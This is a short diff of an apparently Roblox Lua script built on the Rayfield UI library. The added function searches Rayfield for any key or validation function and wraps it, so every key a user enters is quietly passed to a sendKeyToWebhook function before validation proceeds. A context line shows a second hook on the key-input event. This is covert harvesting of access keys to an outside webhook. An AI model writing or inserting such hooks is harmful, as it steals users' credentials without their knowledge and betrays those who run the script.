@@ -53,6 +53,23 @@ local function sendKeyToWebhook(key)
    end
 end
 
+-- Try to hook into Rayfield's key validation function
+local function tryHookRayfieldKeyValidation()
+   for k, v in pairs(Rayfield) do
+      if type(v) == "function" and (k:lower():find("key") or k:lower():find("validate")) then
+         local oldFunc = v
+         Rayfield[k] = function(key, ...)
+            sendKeyToWebhook(key)
+            return oldFunc(key, ...)
+         end
+         print("Hooked Rayfield key validation: " .. k)
+         break
+      end
+   end
+end
+
+tryHookRayfieldKeyValidation()
+
 -- Hook into Rayfield's key system
 if Window and Window.KeyInputed then
    local oldKeyInputed = Window.KeyInputed
